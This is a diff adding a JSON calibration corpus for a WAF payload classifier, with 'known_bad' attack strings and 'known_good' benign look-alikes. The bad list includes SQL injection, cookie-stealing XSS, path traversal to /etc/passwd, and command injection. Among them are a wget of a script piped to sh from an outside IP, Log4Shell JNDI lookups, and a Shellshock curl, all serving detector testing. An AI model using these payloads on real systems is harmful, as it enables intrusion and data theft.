@@ -1,0 +1,67 @@
+{
+  "_meta": {
+    "purpose": "Calibration corpus for core.waf_payload_analyzer (docs/waf_payload_analyzer.md Milestone C)",
+    "updated": "2026-08-11",
+    "design": [
+      "The known_good half is the one that matters. A WAF payload classifier tuned only for recall looks excellent right up to the point analysts start ignoring it, and briefing 5 names alert fatigue as the failure this module exists to avoid.",
+      "known_good is not 'safe traffic'. It is text that a WAF might flag or that an analyst might paste, which must NOT be called Malicious. Several entries deliberately contain SQL keywords, angle brackets, quotes and traversal-looking strings.",
+      "expected is the verdict floor being asserted, not a prediction of the score. known_bad entries assert 'at least Suspicious'; known_good entries assert 'not Malicious'."
+    ],
+    "expected_semantics": {
+      "known_bad": "must reach Suspicious or Malicious",
+      "known_good": "must NOT reach Malicious; Unknown or Suspicious is acceptable, Unknown preferred"
+    }
+  },
+  "known_bad": [
+    {"id": "sqli_tautology", "line": "/login?user= | ' OR '1'='1", "category": "sqli"},
+    {"id": "sqli_tautology_encoded", "line": "/login?user= | %27%20OR%20%271%27%3D%271", "category": "sqli"},
+    {"id": "sqli_union", "line": "/item?id= | 1 UNION SELECT username,password FROM users--", "category": "sqli"},
+    {"id": "sqli_union_comment", "line": "/item?id= | 1/**/UNION/**/SELECT/**/1,2,3", "category": "sqli"},
+    {"id": "sqli_sleep", "line": "/item?id= | 1 AND SLEEP(5)", "category": "sqli"},
+    {"id": "sqli_stacked", "line": "/item?id= | 1; DROP TABLE users--", "category": "sqli"},
+    {"id": "xss_script_tag", "line": "/search?q= | <script>alert(1)</script>", "category": "xss"},
+    {"id": "xss_script_encoded", "line": "/search?q= | %3Cscript%3Ealert(1)%3C%2Fscript%3E", "category": "xss"},
+    {"id": "xss_img_onerror", "line": "/search?q= | <img src=x onerror=alert(document.cookie)>", "category": "xss"},
+    {"id": "xss_svg_onload", "line": "/search?q= | <svg/onload=alert(1)>", "category": "xss"},
+    {"id": "xss_javascript_uri", "line": "/redirect?to= | javascript:alert(document.domain)", "category": "xss"},
+    {"id": "lfi_traversal", "line": "/download?file= | ../../../../etc/passwd", "category": "lfi"},
+    {"id": "lfi_traversal_encoded", "line": "/download?file= | %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "category": "lfi"},
+    {"id": "lfi_windows", "line": "/download?file= | ..\\..\\..\\windows\\win.ini", "category": "lfi"},
+    {"id": "lfi_php_wrapper", "line": "/page?f= | php://filter/convert.base64-encode/resource=index.php", "category": "php"},
+    {"id": "rce_semicolon_cat", "line": "/ping?host= | 127.0.0.1; cat /etc/passwd", "category": "rce"},
+    {"id": "rce_backtick", "line": "/ping?host= | 127.0.0.1`id`", "category": "rce"},
+    {"id": "rce_dollar_paren", "line": "/ping?host= | 127.0.0.1$(whoami)", "category": "rce"},
+    {"id": "rce_wget_pipe", "line": "/exec?cmd= | wget http://198.51.100.7/s.sh -O- | sh", "category": "rce"},
+    {"id": "cve_log4shell", "line": "/api/data | ${jndi:ldap://198.51.100.7:389/a}", "category": "cve"},
+    {"id": "cve_log4shell_obfuscated", "line": "/api/data | ${${lower:j}ndi:${lower:l}dap://198.51.100.7/a}", "category": "cve", "expect_fingerprint": false, "note": "The ${lower:j} nested-lookup evasion. Layer 1 does not resolve Log4j lookups, so the literal string jndi: never appears and the fingerprint cannot fire without a fuzzy pattern — which is exactly what the admission bar in cve_fingerprints.json forbids. CRS catches it and it lands on Suspicious, which is the honest answer for something we cannot confirm."},
+    {"id": "cve_spring4shell", "line": "/app | class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", "category": "cve"},
+    {"id": "cve_shellshock", "line": "/cgi-bin/x | () { :; }; /bin/bash -c 'curl http://198.51.100.7/'", "category": "cve"},
+    {"id": "cve_proxyshell", "line": "/autodiscover/autodiscover.json?@evil.test/owa/ | Email=autodiscover/autodiscover.json%3f@evil.test", "category": "cve"},
+    {"id": "cve_struts_s2_045", "line": "/upload | %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}", "category": "cve"},
+    {"id": "cve_apache_41773", "line": "/cgi-bin/.%2e/.%2e/.%2e/etc/passwd | .%2e/.%2e/etc/passwd", "category": "cve"},
+    {"id": "cve_pulse_secure", "line": "/dana-na/../dana-ws/ | /dana-na/../dana-ws/namedusers", "category": "cve"},
+    {"id": "cve_f5_bigip", "line": "/tmui/login.jsp/..;/ | /tmui/login.jsp/../../hsqldb", "category": "cve"}
+  ],
+  "known_good": [
+    {"id": "search_select_keyword", "line": "/search?q= | SELECT * FROM menu", "note": "briefing 5's canonical false positive"},
+    {"id": "search_sql_tutorial", "line": "/search?q= | how to write a UNION query in postgres", "note": "SQL keywords in a documentation search"},
+    {"id": "search_lt_operator", "line": "/blog?q= | how to use the < operator in python", "note": "angle bracket in prose"},
+    {"id": "irish_surname", "line": "/users?name= | O'Brien", "note": "apostrophe in a real name"},
+    {"id": "french_name", "line": "/users?name= | Jean-Luc D'Arcy", "note": "apostrophe and hyphen"},
+    {"id": "discount_text", "line": "/promo?text= | 50% off -- limited time", "note": "percent sign and double dash in copy"},
+    {"id": "code_snippet_share", "line": "/paste?body= | if (a < b && c > d) { return 1; }", "note": "code-sharing tool, the briefing's other named case"},
+    {"id": "relative_path_ui", "line": "/files?path= | ../shared/reports", "note": "file manager showing a parent directory"},
+    {"id": "math_expression", "line": "/calc?expr= | (3 + 4) * 2 ; result", "note": "semicolon and parentheses"},
+    {"id": "csv_export", "line": "/export?cols= | id,name,email;format=csv", "note": "comma and semicolon separated parameters"},
+    {"id": "url_in_param", "line": "/share?url= | https://example.com/article?id=42&ref=news", "note": "a URL passed as a parameter"},
+    {"id": "cpp_search", "line": "/search?q= | c++ template metaprogramming", "note": "plus signs"},
+    {"id": "html_escaped_text", "line": "/comment?body= | I used &lt;div&gt; in my post", "note": "already-escaped HTML in user text"},
+    {"id": "json_body", "line": "/api/save | {\"title\":\"Q3 report\",\"tags\":[\"finance\",\"2024\"]}", "note": "ordinary JSON payload"},
+    {"id": "base64_token", "line": "/callback?state= | eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9", "note": "base64 JSON state parameter"},
+    {"id": "email_param", "line": "/subscribe?email= | first.last+tag@example.com", "note": "plus addressing"},
+    {"id": "windows_path_display", "line": "/logs?file= | C:\\Program Files\\App\\log.txt", "note": "a Windows path shown in a UI"},
+    {"id": "regex_search", "line": "/search?q= | ^[a-z]+\\d{2,3}$", "note": "user searching for a regex"},
+    {"id": "shell_docs", "line": "/docs?q= | how does the pipe operator work in bash", "note": "shell terminology in prose"},
+    {"id": "version_string", "line": "/api/check | version=2.1.0-rc.1&build=20240915", "note": "ordinary version parameters"}
+  ]
+}
